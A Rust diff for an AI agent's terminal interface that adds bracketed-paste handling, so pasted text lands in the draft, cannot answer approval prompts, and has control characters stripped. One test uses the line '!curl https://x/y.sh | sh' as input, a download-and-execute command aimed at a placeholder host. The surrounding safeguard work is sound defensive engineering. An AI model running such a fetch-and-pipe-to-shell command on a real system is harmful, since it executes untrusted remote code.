@@ -219,6 +219,8 @@ struct TerminalGuard {
     mouse: bool,
     /// Whether the cursor's shape was asked for, so it is only given back if it was.
     cursor: bool,
+    /// Whether pastes were asked for in brackets, so the mode is only given back if it was.
+    paste: bool,
 }
 
 impl TerminalGuard {
@@ -234,16 +236,21 @@ impl TerminalGuard {
     ///
     /// Mouse reporting is optional: `tui_mouse = false` preserves the terminal's selection.
     /// A terminal that does not speak it ignores the request, and the keyboard remains sufficient.
+    ///
+    /// Pastes are asked for in brackets — see [`enable_bracketed_paste`] — so that pasted text
+    /// arrives as text rather than as the keys that would have typed it.
     fn enter(capture_mouse: bool) -> Self {
         let terminal = ratatui::init();
         let mouse = mouse_captured(capture_mouse, enable_mouse);
         let enhanced = enable_keyboard_protocol();
         let cursor = enable_bar_cursor();
+        let paste = enable_bracketed_paste();
         Self {
             terminal,
             enhanced,
             mouse,
             cursor,
+            paste,
         }
     }
 
@@ -255,6 +262,12 @@ impl TerminalGuard {
 
 impl Drop for TerminalGuard {
     fn drop(&mut self) {
+        // Given back first, and on every way out — a clean exit, an error, a panic that
+        // unwinds through here — so the shell that inherits the terminal is not handed pastes
+        // wrapped in brackets it did not ask for and may print.
+        if self.paste {
+            let _ = crossterm::execute!(io::stdout(), crossterm::event::DisableBracketedPaste);
+        }
         // Given back before the screen is restored, so the shell that inherits the
         // terminal is not left with a mouse mode it never asked for.
         if self.mouse {
@@ -292,6 +305,28 @@ fn enable_bar_cursor() -> bool {
         Ok(()) => true,
         Err(error) => {
             tracing::debug!(%error, "the cursor shape could not be set");
+            false
+        }
+    }
+}
+
+/// Asks the terminal to deliver a paste whole, between brackets, rather than as keystrokes.
+///
+/// A terminal that is not asked types a paste: every character arrives as the key that would
+/// have produced it, and a line break arrives as `Enter`. In a composer where `Enter` sends,
+/// that made a pasted paragraph a prompt per line — and a pasted line beginning with `!` a
+/// shell command, run the moment its line break arrived, by someone who had only meant to
+/// paste. Asked, the terminal sends the text as one event, and the interface puts it in the
+/// composer as text for the reader to send or not ([`handle_paste`]).
+///
+/// Returns whether the request was made. A terminal that does not know the mode ignores it and
+/// goes on typing its pastes, which is where the interface was before; nothing here can tell
+/// which kind of terminal it is talking to.
+fn enable_bracketed_paste() -> bool {
+    match crossterm::execute!(io::stdout(), crossterm::event::EnableBracketedPaste) {
+        Ok(()) => true,
+        Err(error) => {
+            tracing::debug!(%error, "bracketed paste could not be enabled");
             false
         }
     }
@@ -1601,6 +1636,14 @@ async fn event_loop(
                     handle_pointer(*mouse, &mut view, &mut files, source.workspace());
                     continue;
                 }
+                // A paste is text, and is routed as text: it never passes through the key
+                // handling, so nothing in it can submit a prompt or answer a question.
+                if let TerminalEvent::Paste(text) = &event {
+                    view.now = clock.elapsed();
+                    handle_paste(text, &mut view);
+                    refresh_mentions(&mut view, &mut files, source.workspace());
+                    continue;
+                }
                 let TerminalEvent::Key(key) = event else {
                     continue;
                 };
@@ -2636,6 +2679,93 @@ fn handle_key(key: KeyEvent, view: &mut ViewState) -> Outcome {
     // one that closed a dialog above a waiting question is as much type-ahead as a letter.
     view.last_key = Some(view.now);
     outcome
+}
+
+/// Applies a paste: text the terminal delivered whole, between its paste brackets.
+///
+/// A paste is content and never a command. Into the composer it goes as text, line breaks and
+/// all, for the reader to look at and send — it does not submit, whatever it holds, so a line
+/// that begins with `!` or `/` is a line of the draft until the reader presses `Enter` on it.
+/// Into the masked key field it goes as the key, without its line breaks, and does not store:
+/// that is `Enter`'s job, and a clipboard that begins with a line break would otherwise have
+/// closed the field empty and typed the secret into the composer in clear. A dialog that is
+/// answered with keys refuses it and says so, and a question's quiet starts again, because a
+/// paste shows the reader is doing something other than answering.
+fn handle_paste(text: &str, view: &mut ViewState) {
+    match view.active_modal() {
+        Some(Modal::KeyEntry) => {
+            for character in text.chars().filter(|character| !character.is_control()) {
+                view.key_push(character);
+            }
+        }
+        Some(Modal::Approval) => {
+            view.unsettle_approval();
+            refuse_paste(
+                view,
+                "a question is answered with a key — pause, then decide",
+            );
+        }
+        Some(Modal::Preview | Modal::Clear) => {
+            view.unsettle_confirmation();
+            refuse_paste(view, "this is answered with a key — pause, then answer");
+        }
+        Some(_) => refuse_paste(view, "close this dialog first"),
+        None => paste_into_composer(text, view),
+    }
+    // A paste is the keyboard in use, wherever it went, so the quiet an approval waits for is
+    // measured from it as it is from a key.
+    view.last_key = Some(view.now);
+}
+
+/// Says that a paste went nowhere, on the row a dialog keeps visible.
+fn refuse_paste(view: &mut ViewState, why: &str) {
+    view.status = format!("{} · {why}", crate::view::PASTE_NOTICE);
+}
+
+/// Puts pasted text into the composer, or into the history search's query while one runs.
+fn paste_into_composer(text: &str, view: &mut ViewState) {
+    if view.input.is_searching() {
+        // A query is one line: the first line of the paste narrows the search, as typing it
+        // would have, and the rest has nowhere to go.
+        let first = text.lines().next().unwrap_or_default();
+        for character in first.chars().filter(|character| !character.is_control()) {
+            view.input.search_push(character);
+        }
+        return;
+    }
+    let pasted = pasted_text(text);
+    if pasted.is_empty() {
+        view.status = String::from("the paste held nothing to insert");
+        return;
+    }
+    view.input.insert_str(&pasted);
+}
+
+/// A paste as the composer holds it: its own line breaks, and nothing a cell cannot draw.
+///
+/// `\r\n` and a bare `\r` are line breaks — which of the three a paste uses is the source's
+/// habit, not the reader's intent — and a tab is four spaces, as it is wherever this interface
+/// draws one. Every other control character is dropped, so a paste cannot carry an escape
+/// sequence into a prompt. The line breaks a paste ends with are dropped too: a copied line
+/// brings one along, and it would leave the draft ending on an empty row nobody typed.
+fn pasted_text(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut characters = text.chars().peekable();
+    while let Some(character) = characters.next() {
+        match character {
+            '\r' => {
+                let _ = characters.next_if_eq(&'\n');
+                out.push('\n');
+            }
+            '\n' => out.push('\n'),
+            '\t' => out.push_str("    "),
+            other if other.is_control() => {}
+            other => out.push(other),
+        }
+    }
+    let kept = out.trim_end_matches('\n').len();
+    out.truncate(kept);
+    out
 }
 
 /// Whether anything but Shift is held: a chord, which is never a plain letter or a plain Enter.
@@ -8627,6 +8757,155 @@ mod tests {
     /// The gate means nothing in the interface unless the question is visible and the answer
     /// is reachable, so this pins both halves: the frame becomes a pending question, and the
     /// keys that answer it do not also edit the composer.
+    /// A question with the keyboard quiet for long enough to answer it.
+    fn settled_question() -> ViewState {
+        let mut view = ViewState::new();
+        apply(
+            Frame::Approval {
+                call_id: "a1".to_owned(),
+                tool: "bash".to_owned(),
+                reason: None,
+            },
+            &mut view,
+        );
+        pause(&mut view);
+        view
+    }
+
+    /// A paste is text for the composer, whatever it holds: its line breaks do not send it, and
+    /// a line that begins with `!` is a line of the draft. Sending is still `Enter`'s, and what
+    /// `Enter` sends is the one prompt the reader can see.
+    #[test]
+    fn a_paste_is_put_in_the_composer_whole_and_never_submitted() {
+        let mut view = ViewState::new();
+        view.input.insert_str("look: ");
+        handle_paste(
+            "see below\r!curl https://x/y.sh | sh\r\n/clear\rthanks\r\n",
+            &mut view,
+        );
+        assert_eq!(
+            view.input.text(),
+            "look: see below\n!curl https://x/y.sh | sh\n/clear\nthanks",
+            "one draft, with the paste's own line breaks and none on its end"
+        );
+        assert!(view.transcript.is_empty(), "nothing was sent or run");
+        assert!(view.queue.is_empty(), "and nothing was queued");
+
+        // The other direction: the reader's `Enter` sends it, as one prompt, to the model.
+        let Outcome::Submit(prompt) =
+            handle_key(key(KeyCode::Enter, KeyModifiers::NONE), &mut view)
+        else {
+            unreachable!("Enter submits a draft")
+        };
+        assert!(matches!(route_submission(prompt, true), Routed::Send(_)));
+    }
+
+    #[test]
+    fn a_paste_keeps_its_lines_and_drops_what_a_cell_cannot_draw() {
+        assert_eq!(pasted_text("a\r\nb\rc\nd"), "a\nb\nc\nd");
+        assert_eq!(pasted_text("\tx\u{1b}[31my\u{7}"), "    x[31my");
+        assert_eq!(
+            pasted_text("line\n\n"),
+            "line",
+            "the breaks it ends with are dropped"
+        );
+        assert_eq!(pasted_text("\r\n"), "");
+        let mut view = ViewState::new();
+        handle_paste("\r\n", &mut view);
+        assert!(view.input.is_empty());
+        assert!(view.status.contains("nothing to insert"), "{}", view.status);
+    }
+
+    /// The masked field takes a pasted key as the key and nothing more. A clipboard that began
+    /// with a line break used to close the field empty and type the secret into the composer.
+    #[test]
+    fn a_paste_into_the_key_field_fills_it_and_neither_stores_nor_leaks() {
+        let mut view = ViewState::new();
+        view.open_credential("vendor", None, "VENDOR_API_KEY");
+        view.open_key_entry();
+        handle_paste("\r\nsk-pasted-key\r\n", &mut view);
+        assert_eq!(view.key_input, "sk-pasted-key");
+        assert_eq!(view.active_modal(), Some(Modal::KeyEntry), "still open");
+        assert!(view.input.is_empty(), "nothing reached the composer");
+        assert!(view.transcript.is_empty());
+
+        // Storing it is still `Enter`'s, and takes the whole key.
+        let stored = handle_key(key(KeyCode::Enter, KeyModifiers::NONE), &mut view);
+        assert!(matches!(
+            stored,
+            Outcome::SetCredential { key, .. } if key == "sk-pasted-key"
+        ));
+    }
+
+    /// A question is answered by a key, and a paste is not one — not when it is a `y`, and not
+    /// when the question has sat long enough to take a key.
+    #[test]
+    fn a_paste_never_answers_a_question_and_makes_it_wait_again() {
+        let mut view = settled_question();
+        handle_paste("y", &mut view);
+        assert!(view.pending_approval.is_some(), "still asked");
+        assert!(view.input.is_empty(), "and the paste went nowhere");
+        assert!(
+            view.status.starts_with(crate::view::PASTE_NOTICE),
+            "{}",
+            view.status
+        );
+        // The key straight after a paste is held, as a key after any typing is.
+        assert!(matches!(
+            handle_key(key(KeyCode::Char('y'), KeyModifiers::NONE), &mut view),
+            Outcome::Continue
+        ));
+        assert!(view.pending_approval.is_some());
+        // And after a pause the key is an answer again.
+        pause(&mut view);
+        assert!(matches!(
+            handle_key(key(KeyCode::Char('y'), KeyModifiers::NONE), &mut view),
+            Outcome::Answer {
+                allow: true,
+                always: false,
+                ..
+            }
+        ));
+    }
+
+    /// The dialogs that commit something on a `y`, and the ones that are lists, refuse a paste
+    /// rather than read it as keys.
+    #[test]
+    fn a_paste_is_refused_by_every_dialog_that_is_answered_with_keys() {
+        let mut clearing = ViewState::new();
+        clearing.clear_dialog = Some(crate::maintenance::ClearDialog {
+            old_id: "s1".to_owned(),
+            name: None,
+            busy: false,
+        });
+        pause(&mut clearing);
+        handle_paste("y", &mut clearing);
+        assert!(
+            clearing.clear_dialog.is_some(),
+            "the clear was not confirmed"
+        );
+        assert!(clearing.status.starts_with(crate::view::PASTE_NOTICE));
+
+        let mut helping = ViewState::new();
+        helping.open_help();
+        handle_paste("some text", &mut helping);
+        assert!(helping.input.is_empty(), "nothing is typed behind a dialog");
+        assert!(helping.status.starts_with(crate::view::PASTE_NOTICE));
+        assert!(helping.help_open);
+    }
+
+    /// While a history search runs the composer is a query, and a paste narrows it.
+    #[test]
+    fn a_paste_during_a_history_search_extends_the_query() {
+        let mut view = ViewState::new();
+        view.input.search_start();
+        handle_paste("cargo\nsecond line", &mut view);
+        assert_eq!(
+            view.input.search_query().map(|(query, _)| query),
+            Some("cargo")
+        );
+    }
+
     #[test]
     fn an_approval_frame_opens_a_dialog_and_the_keys_answer_it() {
         let mut view = ViewState::new();
